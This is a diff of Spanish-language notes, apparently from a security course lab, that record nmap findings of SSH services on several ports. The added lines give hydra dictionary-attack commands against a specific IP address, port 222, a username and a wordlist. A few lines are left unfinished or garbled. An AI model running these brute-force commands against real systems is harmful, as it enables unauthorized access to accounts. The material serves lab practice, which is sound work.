@@ -94,9 +94,7 @@ PORT     STATE SERVICE VERSION
 	* 2202/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
 	* **_2220/tcp open  netiq?_**.
 	* 2222/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
-	
-* https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/
-https://www.youtube.com/watch?v=hn32C2-TzME
+
 
 * Obtendremos más información realizando unas conecciones vía ssh:
 
@@ -192,10 +190,7 @@ debug1: Next authentication method: password
 ```
 
 * Ejecutando ssh con el párametro *_-v_* sobre el puerto(2220) que NO nos permitían intentar realizar una conección rapido obtuvimos la siguiente información tras poder ingresar nuestra clave:
-
-```bash
-PLANTILLA
-```
+	- La salida se encuentra en el archivo [result.txt](\files\result.txt) porque fue muy grande. Y no pude interpretar la salida del debug1. :sad: 
 
 * Por lo que ahora atacaremos los 4 puertos que permiten realizar una conección by ssh.
 
@@ -207,15 +202,20 @@ Obtener mediante un ataque de diccionario la contraseña correspondiente a su  u
 ```bash
 sudo dnf install hydra -y 
 ```
+#### Luego atacaremos el puerto 222 con el comando:
 
+```bash
+hydra -s 222 -l 315073120 -P /home/ntory/CyS/p04/palabras9car.txt 44.199.201.139 -t 4 -f ssh
+```
 
+O si configuras 44.199.201.139 como attackbox2
 
-sudo dnf install hydra -y
 hydra -l usuario -p contraseñaAUsar attackbox2 ssh
+44.199.201.139 
 
-hydra -L archivo_de_usuario -p contraseñaAUsar: attackbox2 ssh 
+hydra -L archivo_de_usuario -p contraseñaAUsar attackbox2 ssh 
 
-hydra -L archivo_de_usuario -P archivo_con_contraseñaAUsar: attackbox2 ssh 
+hydra -L 315073120 -P palabras_9car.txt: 44.199.201.139  ssh 
 
 ###  Crear evidencia de haber entrado al sistema
 
